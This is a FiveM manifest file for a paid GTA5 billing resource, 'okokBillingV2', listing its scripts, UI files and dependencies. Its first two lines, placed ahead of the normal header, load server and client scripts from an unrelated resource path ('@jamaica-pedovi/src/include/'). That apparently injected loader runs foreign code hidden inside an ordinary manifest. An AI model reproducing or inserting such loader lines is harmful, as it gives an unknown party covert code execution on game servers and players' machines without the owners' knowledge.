server_script '@jamaica-pedovi/src/include/server.lua'
client_script '@jamaica-pedovi/src/include/client.lua'
fx_version 'cerulean'

game 'gta5'

author 'okok#3488'
description 'okokBillingV2'
version '1.0.0'

ui_page 'web/ui.html'

files {
    'web/*.*',
}

shared_script 'config.lua'

client_scripts {
    'locales/*.lua',
    'cl_utils.lua',
    'client.lua'
}

server_scripts {
    '@mysql-async/lib/MySQL.lua',
    'locales/*.lua',
    'sv_utils.lua',
    'server.lua'
}

lua54 'yes'

escrow_ignore {
    'config.lua',
    'sv_utils.lua',
    'cl_utils.lua',
    'locales/*.lua',
}
dependency '/assetpacks'